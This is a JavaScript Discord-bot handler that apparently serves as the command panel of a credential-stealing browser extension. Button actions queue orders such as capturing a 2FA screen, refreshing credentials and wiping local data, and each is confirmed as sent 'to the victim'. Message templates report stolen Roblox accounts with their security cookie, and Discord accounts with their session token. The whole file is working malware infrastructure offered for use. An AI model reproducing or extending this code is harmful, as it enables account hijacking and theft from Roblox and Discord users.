// api/interaction.js
import { verifyKey } from 'discord-interactions';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Verificar firma de Discord
    const signature = req.headers['x-signature-ed25519'];
    const timestamp = req.headers['x-signature-timestamp'];
    const body = JSON.stringify(req.body);

    const isValid = verifyKey(body, signature, timestamp, process.env.DISCORD_PUBLIC_KEY);
    if (!isValid) {
        return res.status(401).json({ error: 'Invalid signature' });
    }

    const interaction = req.body;
    console.log('🖱️ Interacción recibida:', JSON.stringify(interaction, null, 2));

    // PING response
    if (interaction.type === 1) {
        return res.status(200).json({ type: 1 });
    }

    // Message component (botón)
    if (interaction.type === 3) {
        const customId = interaction.data.custom_id;
        const [action, userId] = customId.split('_');

        console.log(`Acción: ${action}, UserID: ${userId}`);

        // Inicializar cola de comandos si no existe
        if (!global.commands) global.commands = new Map();

        if (action === 'comandos') {
            // Mostrar submenú
            return res.status(200).json({
                type: 4,
                data: {
                    content: '||@here||\n✏️ **¡ Comandos seleccionados ! **\nElige Una Opcion:',
                    flags: 64, // Ephemeral (solo lo ve quien hizo clic)
                    components: [
                        {
                            type: 1,
                            components: [
                                {
                                    type: 2,
                                    style: 4, // Rojo (Danger)
                                    label: 'Capturar pantalla del 2FA',
                                    custom_id: `capturar_pantalla_${userId}`,
                                    emoji: { name: '📸' }
                                },
                                {
                                    type: 2,
                                    style: 1, // Azul (Primary)
                                    label: 'Actualizar credenciales',
                                    custom_id: `actualizar_credenciales_${userId}`,
                                    emoji: { name: '🔄' }
                                },
                                {
                                    type: 2,
                                    style: 4, // Rojo (Danger)
                                    label: 'Limpiar datos locales',
                                    custom_id: `limpiar_datos_${userId}`,
                                    emoji: { name: '🗑️' }
                                }
                            ]
                        }
                    ]
                }
            });
        } else if (action === 'roblox') {
            // Respuesta inmediata para ROBLOX
            return res.status(200).json({
                type: 4,
                data: {
                    content: '||@here||\n🔔 ¡Informacion seleccionada: **ROBLOX**!\n\n**📌 PRINCIPAL **\n`✅️CUENTA REAL/❌️ CUENTA RECIEN CREADA.`\n👤 Usuario Roblox: (ej. "xX_ProGamer_Xx")\n🆔 ID: (ej. 123456789)\n💰 Robux: (ej. 1,234)\n⭐ Seguidores: (ej. 500)\n👥 Amigos: (ej. 120)\n💱 Premium: (Sí / No)\n🔰 Verificado: (Sí / No)\n\n💼 **Inventario:**\nHeadless: `(Sí / No)`\nKorblox: `(Sí / No)`\n\n**Informacion Horaria:**\n🌍 País: `(ej. Argentina)`\n📅 Fecha: `(ej. 09/03/2026)`\n⏰ Hora Exacta: `(ej. 14:30:22 De la Noche/Tarde/Madrugada)`\n\n🍪 Cookie:\n```_|WARNING:-DO-NOT-SHARE-THIS.--This-message-can...```',
                    flags: 64
                }
            });
        } else if (action === 'discord') {
            // Respuesta inmediata para DISCORD
            return res.status(200).json({
                type: 4,
                data: {
                    content: '||@here||\n🔔 ¡Informacion seleccionada: **DISCORD**!\n\n**📌 PRINCIPAL **\n`✅️CUENTA REAL/❌️ CUENTA RECIEN CREADA.`\n👤 Usuario Discord: (ej. "xX_ProGamer_Xx")\n🆔 ID de Discord: (ej. 123456789)\n👥 Amigos: (ej. 120)\n💱 Discord nitro: (Sí / No)\n\n**Informacion Horaria:**\n🌍 País: `(ej. Argentina)`\n📅 Fecha: `(ej. 09/03/2026)`\n⏰ Hora Exacta: `(ej. 14:30:22 De la Noche/Tarde/Madrugada)`\n\n✨ Token de sesión:\n```(Ej:tmhelgw o como sea la token de sesion)```',
                    flags: 64
                }
            });
        } else {
            // Para los subcomandos (capturar_pantalla, actualizar_credenciales, limpiar_datos)
            // Guardar la orden para la extensión
            let queue = global.commands.get(userId) || [];
            queue.push({ action: action });
            global.commands.set(userId, queue);

            return res.status(200).json({
                type: 4,
                data: {
                    content: `✅ Orden \`${action}\` enviada a la víctima.`,
                    flags: 64
                }
            });
        }
    }

    res.status(400).json({ error: 'Unhandled interaction type' });
}
